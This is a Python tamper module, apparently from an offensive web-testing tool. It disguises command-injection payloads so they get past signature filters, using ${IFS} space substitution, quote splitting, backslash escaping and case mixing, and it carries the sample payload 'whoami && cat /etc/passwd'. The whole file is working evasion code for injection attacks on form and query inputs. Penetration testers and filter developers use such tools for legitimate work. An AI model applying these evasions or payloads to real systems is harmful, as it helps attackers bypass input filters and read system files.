import random
import re

__example_payload__ = "whoami && cat /etc/passwd"
__type__ = "obfuscate shell commands: ${IFS}, quote splitting, backslash escapes, and case mixing"
__category__ = "cmdi"
__chain_stage__ = "lexical"
__contexts__ = ("form", "query")

_WORD = re.compile(r"\b([a-zA-Z][a-zA-Z0-9_]*)\b")
_SHELL_KEYWORDS = frozenset({
    "if", "then", "else", "elif", "fi", "for", "while", "do", "done",
    "case", "in", "esac", "function", "select", "time", "and", "or",
    "not", "local", "exit", "return", "set", "unset", "export",
})


def _quote_split(match):
    word = match.group(1)
    if word.lower() in _SHELL_KEYWORDS or len(word) < 3:
        return word
    quote = random.choice(('"', "'"))
    return quote.join(word)


def _backslash_escape(match):
    word = match.group(1)
    if word.lower() in _SHELL_KEYWORDS:
        return word
    return "\\" + "\\".join(word)


def tamper(payload, **kwargs):
    if not payload:
        return payload

    strategy = kwargs.get("strategy", -1)
    if strategy == -1:
        strategy = random.randrange(4)

    if strategy == 0:
        # whoami && cat /etc/passwd -> whoami${IFS}&&${IFS}cat${IFS}/etc/passwd
        return payload.replace(" ", "${IFS}")
    if strategy == 1:
        # whoami -> w"h"o"a"m"i (adjacent quoted strings concatenate in bash/sh)
        return _WORD.sub(_quote_split, payload)
    if strategy == 2:
        # whoami -> \w\h\o\a\m\i (backslash before a non-special char is literal)
        return _WORD.sub(_backslash_escape, payload)
    # strategy 3: case-mixed commands (works against case-sensitive signature rules,
    # and is legal on Windows cmd where commands are case-insensitive)
    return _WORD.sub(lambda m: m.group(1).swapcase(), payload)
